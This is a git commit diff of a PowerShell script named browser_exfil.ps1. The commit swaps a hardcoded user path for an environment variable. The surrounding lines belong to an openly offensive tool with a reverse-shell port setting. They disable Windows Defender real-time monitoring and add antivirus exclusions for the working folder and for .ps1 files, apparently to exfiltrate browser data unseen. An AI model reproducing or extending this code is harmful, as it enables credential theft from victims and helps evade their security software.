d347358439a80d4a8b351adaea1cb4733f2aa6bf
Tech <killyourself11371919@gmail.com>
2025-10-22 00:34:27 -0500

    Update browser_exfil.ps1

--- browser_exfil.ps1
+++ browser_exfil.ps1
@@ -11,14 +11,14 @@ $PORT = 'YOUR_PORT'            # Port to use for the reverse shell
 
 
 
-$duckletter = "C:\Users\Noah\Downloads\tmp"
+$duckletter = "C:\Users\$env:USERPROFILE\Downloads\tmp"
 Set-Location $duckletter
 
 Set-MpPreference -DisableRealtimeMonitoring $true
 Add-MpPreference -ExclusionPath "${duckletter}\"
 Set-MpPreference -ExclusionExtension "ps1"
 
-$destDir = "C:\Users\Noah\Downloads\tmp"
+$destDir = "C:\Users\$env:USERPROFILE\Downloads\tmp"
 if (-Not (Test-Path $destDir)) {
     New-Item -ItemType Directory -Path $destDir
 }
